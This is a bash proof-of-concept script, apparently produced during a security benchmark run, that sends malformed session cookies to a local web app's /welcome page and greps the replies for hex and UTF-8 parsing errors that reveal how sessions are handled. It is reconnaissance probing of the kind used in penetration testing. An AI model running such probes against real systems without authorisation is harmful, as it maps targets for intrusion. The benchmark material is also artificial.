#!/bin/bash
# POC: Demonstrate information disclosure via session parsing errors by sending malformed session cookies
# Target: ./repo
# Created: 2025-12-01T16:16:50.141Z
# Session: benchmark-XBEN-103-24-mincfo1r

# Session Parsing Error Information Disclosure POC
# Tests for detailed error messages that expose session handling implementation

TARGET_HOST="${1:-127.0.0.1:8000}"
TARGET_URL="http://${TARGET_HOST}"

echo "=========================================="
echo "Session Parsing Error Information Disclosure POC"
echo "=========================================="
echo "Target: ${TARGET_URL}"
echo ""

# Test 1: Invalid hex characters in session cookie
echo "[*] Test 1: Invalid hex characters (non-hexadecimal)"
echo "Request: GET /welcome with invalid_session_token"
RESPONSE1=$(curl -s -w "\n%{http_code}" -b "session=invalid_session_token" "${TARGET_URL}/welcome")
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n1)
BODY1=$(echo "$RESPONSE1" | head -n-1)

echo "HTTP Status: $HTTP_CODE1"
echo "Response body:"
echo "$BODY1"
echo ""

# Check if we can detect the parsing error message
if echo "$BODY1" | grep -q "fromhex\|hexadecimal"; then
    echo "[+] VULNERABLE: Found hex parsing error message"
    echo "[+] This exposes: Hex encoding is used for session data"
else
    echo "[-] No hex parsing error detected"
fi
echo ""

# Test 2: Invalid UTF-8 sequence (long hex string with invalid continuation bytes)
echo "[*] Test 2: Invalid UTF-8 byte sequence"
echo "Request: GET /welcome with long invalid hex string"
RESPONSE2=$(curl -s -w "\n%{http_code}" -b "session=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" "${TARGET_URL}/welcome")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n1)
BODY2=$(echo "$RESPONSE2" | head -n-1)

echo "HTTP Status: $HTTP_CODE2"
echo "Response body:"
echo "$BODY2"
echo ""

# Check for UTF-8 decoding errors
if echo "$BODY2" | grep -q "utf-8\|codec\|decode\|continuation byte"; then
    echo "[+] VULNERABLE: Found UTF-8 decoding error message"
    echo "[+] This exposes: UTF-8 decoding is used after hex parsing"
    echo "[+] This reveals parsing order and mechanism"
else
    echo "[-] No UTF-8 decoding error detected"
fi
echo ""

# Test 3: Another UTF-8 invalid sequence
echo "[*] Test 3: Another invalid UTF-8 sequence"
echo "Request: GET /welcome with another malformed session"
RESPONSE3=$(curl -s -w "\n%{http_code}" -b "session=98989898989898989898" "${TARGET_URL}/welcome")
HTTP_CODE3=$(echo "$RESPONSE3" | tail -n1)
BODY3=$(echo "$RESPONSE3" | head -n-1)

echo "HTTP Status: $HTTP_CODE3"
echo "Response body:"
echo "$BODY3"
echo ""

# Summary
echo "=========================================="
echo "POC Summary"
echo "=========================================="
if ( echo "$BODY1" | grep -q "hexadecimal\|fromhex" ) || ( echo "$BODY2" | grep -q "utf-8\|codec" ) || ( echo "$BODY3" | grep -q "utf-8\|codec" ); then
    echo "[✓] VULNERABILITY CONFIRMED: Session parsing errors expose implementation details"
    echo ""
    echo "Information Disclosed:"
    echo "- Session format uses hex encoding"
    echo "- Hex strings are decoded to binary"
    echo "- Binary is then UTF-8 decoded"
    echo "- Specific byte positions are revealed in error messages"
    echo ""
    exit 0
else
    echo "[-] Could not confirm session parsing error disclosure"
    echo "[-] Application may be handling errors silently or differently"
    exit 1
fi